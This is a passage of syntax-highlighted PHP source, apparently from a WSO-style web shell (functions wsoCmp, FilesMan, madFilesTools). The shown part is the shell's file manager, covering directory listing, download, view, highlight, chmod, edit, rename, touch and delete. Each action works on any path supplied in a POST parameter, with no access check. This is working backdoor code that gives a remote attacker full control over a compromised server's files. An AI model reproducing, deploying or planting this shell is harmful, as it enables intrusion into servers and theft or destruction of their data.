<span class="lineno"> 683</span>            <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 684</span>    <span class="p">}</span>
<span class="lineno"> 685</span>    <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
<span class="lineno"> 686</span>    <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
<span class="lineno"> 687</span>    <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span>
<span class="lineno"> 688</span>    <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 689</span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 690</span>        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$l</span><span class="o">?</span><span class="s1">&#39; class=l1&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot; title=&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&amp;gt;&amp;lt;b&amp;gt;| &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; |&amp;lt;/b&amp;gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="nx">madSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span><span class="o">:</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span>
<span class="lineno"> 691</span>            <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&amp;gt;R&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&amp;gt;T&amp;lt;/a&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&amp;gt;E&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&amp;gt;D&amp;lt;/a&amp;gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,null,\&#39;delete\&#39;, \&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&amp;gt; X &amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 692</span>        <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno"> 693</span>    <span class="p">}</span>
<span class="lineno"> 694</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=7&amp;gt;</span>
<span class="lineno"> 695</span> <span class="s2">  &amp;lt;input type=hidden name=a value=&#39;FilesMan&#39;&amp;gt;</span>
<span class="lineno"> 696</span> <span class="s2">  &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="lineno"> 697</span> <span class="s2">  &amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="lineno"> 698</span> <span class="s2">  &amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 699</span> 
<span class="lineno"> 700</span>    
<span class="lineno"> 701</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno"> 702</span>  <span class="p">}</span>
<span class="lineno"> 703</span>     
<span class="lineno"> 704</span>   <span class="k">function</span> <span class="nf">madFilesTools</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 705</span>    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno"> 706</span>        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 707</span>    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 708</span>        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 709</span>            <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
<span class="lineno"> 710</span>            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 711</span>            <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 712</span>                <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 713</span>                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">);</span>
<span class="lineno"> 714</span>            <span class="p">}</span> <span class="k">else</span>
<span class="lineno"> 715</span>                 <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno"> 716</span>            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno"> 717</span>            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 718</span>                <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span>
<span class="lineno"> 719</span>                    <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
<span class="lineno"> 720</span>                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 721</span>            <span class="p">}</span>
<span class="lineno"> 722</span>        <span class="p">}</span><span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 723</span>    <span class="p">}</span>
<span class="lineno"> 724</span>    <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 725</span>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 726</span>            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno"> 727</span>            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 728</span>                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span>
<span class="lineno"> 729</span>                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 730</span>            <span class="p">}</span>
<span class="lineno"> 731</span>        <span class="p">}</span>
<span class="lineno"> 732</span>    <span class="p">}</span>
<span class="lineno"> 733</span>    
<span class="lineno"> 734</span>    <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno"> 735</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 736</span>    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 737</span>        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;FILE DOEST NOT EXITS &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 738</span>        <span class="nx">madFooter</span><span class="p">();</span>
<span class="lineno"> 739</span>        <span class="k">return</span><span class="p">;</span>
<span class="lineno"> 740</span>    <span class="p">}</span>
<span class="lineno"> 741</span>    <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 742</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 743</span>        <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 744</span>        <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 745</span>    <span class="p">}</span> <span class="k">else</span> <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 746</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Name:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Size:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">madSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">:</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Permission:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nx">madPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Owner/Group:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 747</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 748</span>    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno"> 749</span>        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span>
<span class="lineno"> 750</span>    <span class="k">if</span><span class="p">(</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno"> 751</span>        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
<span class="lineno"> 752</span>    <span class="k">else</span>
<span class="lineno"> 753</span>        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
<span class="lineno"> 754</span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
<span class="lineno"> 755</span>        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;a  href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&amp;gt;&amp;lt;span&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">==@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&amp;lt;b&amp;gt;&amp;lt;span&amp;gt; &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/span&amp;gt; &amp;lt;/b&amp;gt;&#39;</span><span class="o">:</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
<span class="lineno"> 756</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 757</span>    <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 758</span>        <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span>
<span class="lineno"> 759</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 760</span>            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno"> 761</span>            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 762</span>                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
<span class="lineno"> 763</span>                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
<span class="lineno"> 764</span>                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 765</span>            <span class="p">}</span>
<span class="lineno"> 766</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 767</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 768</span>        <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span>
<span class="lineno"> 769</span>            <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 770</span>                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 771</span>                <span class="nv">$code</span> <span class="o">=</span> <span class="o">@</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="k">true</span><span class="p">);</span>
<span class="lineno"> 772</span>                <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;span &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;/span&amp;gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;font &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">),</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 773</span>            <span class="p">}</span>
<span class="lineno"> 774</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 775</span>        <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span>
<span class="lineno"> 776</span>            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 777</span>                <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 778</span>                <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span>
<span class="lineno"> 779</span>                    <span class="nv">$perms</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
<span class="lineno"> 780</span>                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span>
<span class="lineno"> 781</span>                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;document.mf.p3.value=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 782</span>            <span class="p">}</span>
<span class="lineno"> 783</span>            <span class="nb">clearstatcache</span><span class="p">();</span>
<span class="lineno"> 784</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=chmod value=&quot;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 785</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 786</span>        <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span>
<span class="lineno"> 787</span>            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 788</span>                <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span>
<span class="lineno"> 789</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 790</span>            <span class="p">}</span>
<span class="lineno"> 791</span>            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
